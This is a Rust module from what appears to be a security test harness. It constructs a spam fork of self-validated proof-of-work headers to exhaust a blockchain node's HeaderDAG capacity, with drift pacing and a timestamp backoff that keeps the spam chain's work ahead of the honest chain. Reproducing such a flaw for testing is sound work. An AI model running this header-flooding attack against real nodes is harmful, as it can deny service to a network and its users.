//! Spam fork construction for the C10 HeaderDAG-capacity pin.
//!
//! Builds a linear chain of native-valid PoW headers on top of an honest
//! parent, following exactly the consensus rules the pinned release node
//! enforces before a header may enter its HeaderDAG: parent-hash linkage,
//! height, ASERT target, MTP + future drift, Poseidon2b PoW and the
//! hard-finalized slot expansion. Every header is self-validated with the
//! production validators from `noid_chain` before it is served.

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use anyhow::{bail, Context, Result};
use noid_chain::block_header::{block_id, BlockHeader};
use noid_chain::consensus::header::validate_header_timeless_prehashed_parent;
use noid_chain::consensus::params::{
    block_time_at_height, EXPANSION_WINDOW, MAX_FUTURE_DRIFT, MEDIAN_TIME_BLOCKS,
};
use noid_chain::consensus::pow::{pow_header_fields, PowHeaderFields, PowNonceBatchHasher};
use noid_chain::consensus::{
    asert_anchor_height, expected_child_log_slots, finalized_expansion_window, next_target,
    validate_future_drift,
};
use noid_poseidon2b::primitives::Address;

/// The spam chain view: the honest suffix plus the fork.
pub struct SpamChain {
    /// Headers oldest first; `headers[i].height == base_height + i`.
    pub headers: Vec<BlockHeader>,
    pub base_height: u64,
    /// Height of the honest fork parent (spam children live above it).
    pub fork_height: u64,
}

fn le256_lt(a: &[u8; 32], b: &[u8; 32]) -> bool {
    for i in (0..32).rev() {
        if a[i] != b[i] {
            return a[i] < b[i];
        }
    }
    false
}

/// Grind one header's nonce in parallel over disjoint ranges.
fn parallel_search(
    fields: &PowHeaderFields,
    target: &[u8; 32],
    threads: usize,
) -> Result<u128> {
    if threads < 1 {
        bail!("need at least one grind thread");
    }
    let found = Arc::new(AtomicBool::new(false));
    let result_nonce: Arc<Mutex<Option<u128>>> = Arc::new(Mutex::new(None));
    let chunk: u128 = 1 << 26;
    std::thread::scope(|scope| {
        for t in 0..threads {
            let found = Arc::clone(&found);
            let result_nonce = Arc::clone(&result_nonce);
            let mut hasher = PowNonceBatchHasher::new(fields);
            scope.spawn(move || {
                let mut digests = [[0u8; 32]; 64];
                let mut base = (t as u128) * chunk;
                while !found.load(Ordering::Relaxed) {
                    hasher.hash_into(base, &mut digests);
                    for (i, digest) in digests.iter().enumerate() {
                        if le256_lt(digest, target) {
                            let nonce = base + i as u128;
                            if let Ok(mut guard) = result_nonce.lock() {
                                if guard.is_none() {
                                    *guard = Some(nonce);
                                }
                            }
                            found.store(true, Ordering::Relaxed);
                            return;
                        }
                    }
                    base += digests.len() as u128;
                }
            });
        }
    });
    let nonce = result_nonce
        .lock()
        .expect("grind mutex")
        .expect("a nonce was found before exhaustion");
    Ok(nonce)
}

impl SpamChain {
    /// Build the chain from the honest suffix (oldest first, ending at the
    /// intended fork parent = the last honest header) plus `count` spam
    /// children. Child stamps advance one block-time per height from the fork
    /// parent's timestamp (minus a half-second per header; see `child_stamp`),
    /// which keeps every child's ASERT target at the fork-parent target level.
    /// The grind is paced against the future-drift bound: a child may not be
    /// built while its stamp is more than MAX_FUTURE_DRIFT ahead of wall
    /// clock, so the spam chain takes ~block_time per header of wall time.
    pub fn build(
        honest_suffix: Vec<BlockHeader>,
        count: u64,
        threads: usize,
        progress: impl Fn(u64),
    ) -> Result<Self> {
        if honest_suffix.is_empty() {
            bail!("honest suffix must contain the fork parent");
        }
        let mut headers = honest_suffix;
        let base_height = headers[0].height;
        for (i, header) in headers.iter().enumerate() {
            if header.height != base_height + i as u64 {
                bail!("honest suffix is not contiguous");
            }
        }
        let fork_height = headers.last().expect("checked non-empty").height;
        let fork_ts = headers.last().expect("checked non-empty").timestamp;
        println!(
            "[aggressor] stamp plan: fork parent h{fork_height} ts {fork_ts}; \
             children advance one block-time per height, drift-paced"
        );

        let started = Instant::now();
        for i in 0..count {
            let stamp = Self::child_stamp(fork_ts, fork_height, fork_height + i + 1);
            // Drift pacing: the stamp must be within MAX_FUTURE_DRIFT of wall
            // clock at build time. Waiting only relaxes the bound afterwards
            // (wall clock keeps moving), so a long grind cannot violate it.
            while stamp > unix_now() + MAX_FUTURE_DRIFT {
                let wait_secs = stamp - unix_now() - MAX_FUTURE_DRIFT;
                if wait_secs > 5 {
                    println!(
                        "[aggressor] drift pacing: header {i} stamp {stamp} is \
                         {wait_secs}s ahead; waiting"
                    );
                }
                let nap = wait_secs.min(30).max(1);
                std::thread::sleep(Duration::from_secs(nap));
            }
            let child = Self::next_header(&headers, stamp, threads)
                .with_context(|| format!("building spam header {i}"))?;
            headers.push(child);
            if (i + 1) % 25 == 0 || i + 1 == count {
                progress(i + 1);
            }
        }
        println!(
            "[aggressor] grind: {count} headers in {:?} ({} threads)",
            started.elapsed(),
            threads
        );
        Ok(Self {
            headers,
            base_height,
            fork_height,
        })
    }

    /// The stamp for a spam child at `child_height`: one block-time per height
    /// above the fork parent, minus half a second per header. The block-time
    /// step keeps ASERT (which under v2 reads the PARENT's stamp against the
    /// epoch anchor) at the fork-parent target level; the half-second backoff
    /// tightens the spam target by 2^(0.5/180) per header (~2.7x over 511),
    /// a work margin over the honest chain's equilibrium level so the spam tip
    /// stays best well past the DAG fill point.
    fn child_stamp(fork_ts: u64, fork_height: u64, child_height: u64) -> u64 {
        let n = child_height - fork_height;
        fork_ts + block_time_at_height(child_height) * n - n / 2
    }

    /// The header at `height`, if tracked.
    pub fn header_at(&self, height: u64) -> Option<&BlockHeader> {
        if height < self.base_height {
            return None;
        }
        self.headers.get((height - self.base_height) as usize)
    }

    pub fn fork_parent(&self) -> &BlockHeader {
        self.header_at(self.fork_height)
            .expect("fork parent is tracked")
    }

    /// Last ≤11 ancestor timestamps (oldest first) for the child of `parent`.
    fn prev_timestamps(headers: &[BlockHeader], parent_height: u64, base_height: u64) -> Vec<u64> {
        let mut out = Vec::with_capacity(MEDIAN_TIME_BLOCKS as usize);
        let start = parent_height
            .saturating_sub(MEDIAN_TIME_BLOCKS as u64 - 1)
            .max(base_height);
        for h in start..=parent_height {
            if let Some(header) = headers.get((h - base_height) as usize) {
                out.push(header.timestamp);
            }
        }
        out
    }

    /// The hard-finalized expansion window (oldest first) for the child of
    /// the header at `parent_height`.
    fn finalized_active_counts(
        headers: &[BlockHeader],
        parent_height: u64,
        base_height: u64,
    ) -> Vec<u64> {
        match finalized_expansion_window(parent_height) {
            Some((start, end)) => {
                let mut out = Vec::with_capacity(EXPANSION_WINDOW as usize);
                for h in start..=end {
                    match headers.get((h - base_height) as usize) {
                        Some(header) => out.push(header.active_slot_count),
                        // Below the tracked suffix: devnet honest blocks are
                        // empty, matching the production expectation.
                        None => out.push(0),
                    }
                }
                out
            }
            None => Vec::new(),
        }
    }

    fn next_header(headers: &[BlockHeader], timestamp: u64, threads: usize) -> Result<BlockHeader> {
        let parent = headers.last().expect("checked non-empty");
        let parent_id = block_id(parent);
        let base_height = headers[0].height;
        let anchor_height = asert_anchor_height(parent.height);
        let anchor = headers
            .get((anchor_height - base_height) as usize)
            .with_context(|| format!("ASERT anchor h{anchor_height} below tracked suffix"))?;
        let target = next_target(
            anchor_height,
            anchor.timestamp,
            &anchor.difficulty_target,
            parent.height + 1,
            parent.timestamp,
            timestamp,
        );
        let counts = Self::finalized_active_counts(headers, parent.height, base_height);
        let log_slots = expected_child_log_slots(parent.height, parent.log_slots, &counts);
        let mut template = BlockHeader {
            prev_block_hash: parent_id,
            state_root: [0xA5; 32],
            tx_root: [0x5A; 32],
            timestamp,
            height: parent.height + 1,
            miner_address: Address([0xC0; 32]),
            nonce: 0,
            difficulty_target: target,
            log_slots,
            active_slot_count: 0,
            alloc_counter: 0,
        };

        // Grind the PoW over disjoint nonce ranges.
        let fields = pow_header_fields(&template);
        template.nonce = parallel_search(&fields, &template.difficulty_target, threads)?;

        // Self-validate with the production validators the victim runs.
        let prev_ts = Self::prev_timestamps(headers, parent.height, base_height);
        validate_header_timeless_prehashed_parent(
            &template,
            parent,
            parent_id,
            &prev_ts,
            &counts,
            anchor_height,
            anchor.timestamp,
            &anchor.difficulty_target,
        )
        .context("spam header failed native timeless validation")?;
        validate_future_drift(template.timestamp, unix_now())
            .context("spam header failed future drift")?;
        Ok(template)
    }
}

pub fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("clock after epoch")
        .as_secs()
}
